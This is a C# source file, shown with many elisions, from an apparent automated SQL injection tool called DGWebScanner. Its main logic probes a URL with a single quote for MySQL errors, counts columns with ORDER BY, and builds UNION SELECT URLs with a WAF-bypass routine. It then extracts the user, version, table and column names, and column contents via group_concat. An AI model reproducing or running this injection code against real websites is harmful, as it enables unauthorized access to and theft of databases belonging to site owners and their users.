...
namespace DGWebScanner
{
    ...
    {
        public static string OriginalWebsiteHtml { get; set; }
        public static string OriginalWebsiteUrl { get; set; }
        public static string OriginalBeforeEqualSign { get; set; }
        public static string OriginalAfterEqualSign { get; set; }
            ...
            try
            {
                ...
                statusInfo.Invoke((MethodInvoker)delegate
               {
                ...
                try
                {
                    ...
                    OriginalWebsiteUrl = websiteURL.Text;
                    OriginalWebsiteHtml = HelpfulFunctions.GetHtml(OriginalWebsiteUrl);
                    try
                    {
                        Debug.WriteLine(websiteURL.Text + "'");
                        SingleQuoteBypass.SingleQuoteUrl =
                            SingleQuoteBypass.ReturnCorrectBaseUrLandGetSingleQuoteHtml(OriginalWebsiteUrl);
                        getVulnerableInfo.ReportProgress(15);
                        //If website is vulnerable
                        if (!SingleQuoteBypass.SingleQuoteHtml.Contains(OriginalWebsiteHtml))
                        {
                            if (SingleQuoteBypass.SingleQuoteHtml.Contains("MySQL Query Error") ||
                                SingleQuoteBypass.SingleQuoteHtml.Contains("manual that corresponds to your MySQL"))
                            {
                            ...
                            statusInfo.Invoke((MethodInvoker)delegate
                           {
                            ...
                            OriginalBeforeEqualSign = OriginalWebsiteUrl.Split('=')[0];
                            OriginalAfterEqualSign = OriginalWebsiteUrl.Split('=')[1];

                            OrderbyBypass.AvailableColumns = OrderbyBypass.GetAvailableColumns(OriginalBeforeEqualSign,
                                OriginalAfterEqualSign);
                            columnsStatus.Invoke((MethodInvoker)delegate
                           {
                               columnsStatus.Text = OrderbyBypass.AvailableColumns.ToString();
                           });
                            ...
                            statusInfo.Invoke((MethodInvoker)delegate
                           {
                            ...
                            columnNumbers = "19970";
                            for (int i = 19971; i < 19970 + OrderbyBypass.AvailableColumns; i++)
                            {
                            ...
                            string wafBypassUnionSelectUrl = OriginalBeforeEqualSign + "=-" + OriginalAfterEqualSign +
                                                             "+union+select+" +
                                                             columnNumbers + "--";
                            string[] unionSelectResponse = WafBypassUnionSelect(wafBypassUnionSelectUrl);
                            string vulnerableColumnsUrl = unionSelectResponse[0];
                            Debug.WriteLine("vulnerableColumnsUrl : " + vulnerableColumnsUrl);
                            ...
                            using (WebClient client = new WebClient())
                            {
                                ...
                                if (unionSelectNormalBypassNo == "normal" || unionSelectNormalBypassNo == "bypass")
                                {
                                    ...
                                    for (int i = 19971; i < 19970 + OrderbyBypass.AvailableColumns; i++)
                                    {
                                        ...
                                        {
                                            correctColumnNumber = correctColumnNumber + (i - 19969) + ",";
                                        }
                                        else
                                        {
                                    ...
                                    statusInfo.Invoke((MethodInvoker)delegate
                                   {
                                    ...
                                    string userVersionColumns =
                                        columnNumbers.Replace(
                                            (19969 + Convert.ToInt32(firstVulnerableColumn)).ToString(),
                                  ...
                                  Debug.WriteLine("userVersionColumns : " + userVersionColumns);
                                    ...
                                    {
                                        userVersionUrl = OriginalBeforeEqualSign + "=-" + OriginalAfterEqualSign +
                                                         "+union+select+" +
                                                         userVersionColumns + "--";
                                    }
                                    else
                                    ...
                                    Debug.WriteLine("userVersionUrl : " + userVersionUrl);
                                    ...
                                    else
                                    {
                                        ...
                                        statusInfo.Invoke((MethodInvoker)delegate
                                       {
                                        ...
                                        foundTableAndColumnNamesUrl = OriginalBeforeEqualSign + "=-" +
                                                                      OriginalAfterEqualSign +
        ...
        private void databaseInfoTreeView_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (databaseInfoTreeView.SelectedNode.Level == 2 && e.Node.Parent.Parent.Text != "information_schema")
            {
                string foundColumnContent =
                    columnNumbers.Replace((19969 + Convert.ToInt32(firstVulnerableColumn)).ToString(),
                        "group_concat(2448," + e.Node.Text + ",3559)");
                string foundColumnContentUrl = OriginalBeforeEqualSign + "=-" + OriginalAfterEqualSign +
                                               "+union+select+" + foundColumnContent +
        ...
        private void checkUpdates_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                ...
                if (result > 0)
                {
                    ...
                    string changeLog = HelpfulFunctions.GetHtml("http://raw.githubusercontent.com/Dgameman1/DGWebScanner/master/Changelog.txt");
                ...
                {
                    Debug.WriteLine("Current version is newer than online version");
                    //IMPOSSIBLE
                }
                else
                {
                    Debug.WriteLine("Version are the same");
